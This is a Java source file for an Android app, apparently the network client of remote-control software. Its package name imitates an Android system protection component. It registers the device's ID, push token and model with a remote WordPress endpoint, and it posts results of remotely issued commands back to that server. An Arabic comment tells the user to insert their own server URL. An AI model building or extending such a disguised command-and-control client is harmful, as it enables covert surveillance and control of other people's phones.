package com.android.system.protection.api;

import android.content.Context;
import android.util.Log;

import com.android.system.protection.utils.PreferencesHelper;

import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class WordPressClient {

    // غير هذا الرابط إلى رابط API الخاص بك (مثلاً https://dev-would-photo.pantheonsite.io/wp-json/dcp/v1/)
    private static final String BASE_URL = "https://dev-would-photo.pantheonsite.io/wp-json/dcp/v1/";
    private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
    private static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    public interface Callback {
        void onSuccess(String response);
        void onFailure(Exception e);
    }

    public static void registerDevice(Context context, Callback callback) {
        String deviceId = PreferencesHelper.getDeviceId(context);
        String fcmToken = PreferencesHelper.getFcmToken(context);
        if (fcmToken == null) {
            callback.onFailure(new Exception("FCM token not available yet"));
            return;
        }

        JSONObject json = new JSONObject();
        try {
            json.put("device_id", deviceId);
            json.put("fcm_token", fcmToken);
            json.put("device_model", android.os.Build.MODEL);
            json.put("android_version", android.os.Build.VERSION.RELEASE);
            json.put("sdk", android.os.Build.VERSION.SDK_INT);
        } catch (Exception e) {
            callback.onFailure(e);
            return;
        }

        RequestBody body = RequestBody.create(json.toString(), JSON);
        Request request = new Request.Builder()
                .url(BASE_URL + "register")
                .post(body)
                .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                callback.onFailure(e);
            }

            @Override
            public void onResponse(okhttp3.Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    callback.onSuccess(response.body().string());
                } else {
                    callback.onFailure(new Exception("Server error: " + response.code()));
                }
            }
        });
    }

    public static void sendResult(Context context, String commandId, JSONObject result, Callback callback) {
        String deviceId = PreferencesHelper.getDeviceId(context);
        try {
            result.put("device_id", deviceId);
            result.put("command_id", commandId);
        } catch (Exception e) {
            callback.onFailure(e);
            return;
        }

        RequestBody body = RequestBody.create(result.toString(), JSON);
        Request request = new Request.Builder()
                .url(BASE_URL + "send_result")
                .post(body)
                .build();

        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onFailure(okhttp3.Call call, IOException e) {
                callback.onFailure(e);
            }

            @Override
            public void onResponse(okhttp3.Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    callback.onSuccess(response.body().string());
                } else {
                    callback.onFailure(new Exception("Server error: " + response.code()));
                }
            }
        });
    }
}